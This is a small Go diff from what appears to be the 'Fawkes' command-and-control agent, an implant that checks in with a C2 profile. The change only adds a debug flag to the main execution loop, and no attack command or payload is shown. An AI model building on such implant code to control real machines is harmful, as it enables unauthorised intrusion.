@@ -128,7 +128,7 @@ func main() {
 
 	go func() {
 		defer wg.Done()
-		mainLoop(ctx, agent, c2, maxRetriesInt, sleepIntervalInt)
+		mainLoop(ctx, agent, c2, maxRetriesInt, sleepIntervalInt, debugBool)
 	}()
 
 	// Wait for shutdown signal or completion
@@ -136,7 +136,7 @@ func main() {
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, maxRetriesInt int, sleepIntervalInt int) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, maxRetriesInt int, sleepIntervalInt int, debugBool bool) {
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
 
 	// Initial checkin
